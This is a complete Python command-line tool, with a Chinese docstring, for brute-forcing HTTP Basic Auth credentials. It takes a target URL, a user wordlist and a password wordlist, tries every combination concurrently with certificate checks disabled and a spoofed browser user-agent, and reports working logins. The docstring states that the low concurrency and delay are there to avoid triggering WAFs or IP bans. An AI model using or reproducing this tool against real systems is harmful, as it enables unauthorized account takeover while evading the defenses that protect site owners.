#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HTTP Basic Auth 爆破（低并发 + 退避，避免触发 WAF/封 IP）
用法: python3 basicauth_brute.py <url> <userlist> <passlist> [--conc 4] [--delay 0.15]
"""
import sys, ssl, base64, time, json, argparse, urllib.request, urllib.error, concurrent.futures

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE

def try_one(url, user, pwd, delay):
    if delay: time.sleep(delay)
    tok = base64.b64encode(f"{user}:{pwd}".encode()).decode()
    r = urllib.request.Request(url, headers={"User-Agent": UA, "Authorization": f"Basic {tok}"})
    try:
        with urllib.request.urlopen(r, timeout=10, context=CTX) as resp:
            return (user, pwd, resp.status, resp.read(200))
    except urllib.error.HTTPError as e:
        return (user, pwd, e.code, b"")
    except Exception as e:
        return (user, pwd, 0, str(e).encode()[:100])

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url"); ap.add_argument("users"); ap.add_argument("passes")
    ap.add_argument("--conc", type=int, default=4); ap.add_argument("--delay", type=float, default=0.15)
    a = ap.parse_args()
    users = [l.strip() for l in open(a.users) if l.strip()]
    passes = [l.strip() for l in open(a.passes) if l.strip()]
    print(f"[*] {len(users)} users x {len(passes)} passes = {len(users)*len(passes)} attempts", file=sys.stderr)
    n = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=a.conc) as ex:
        futs = [ex.submit(try_one, a.url, u, p, a.delay) for u in users for p in passes]
        for f in concurrent.futures.as_completed(futs):
            u, p, st, body = f.result()
            n += 1
            if st in (200, 302, 301):
                print(json.dumps({"HIT": True, "user": u, "pass": p, "status": st,
                                  "body": body.decode("utf-8", "replace")[:150]}))
            elif st not in (401, 0):
                print(json.dumps({"odd": True, "user": u, "pass": p, "status": st}))
            if n % 50 == 0:
                print(f"[*] {n} done", file=sys.stderr)
    print(json.dumps({"done": True, "attempts": n}))

if __name__ == "__main__":
    main()
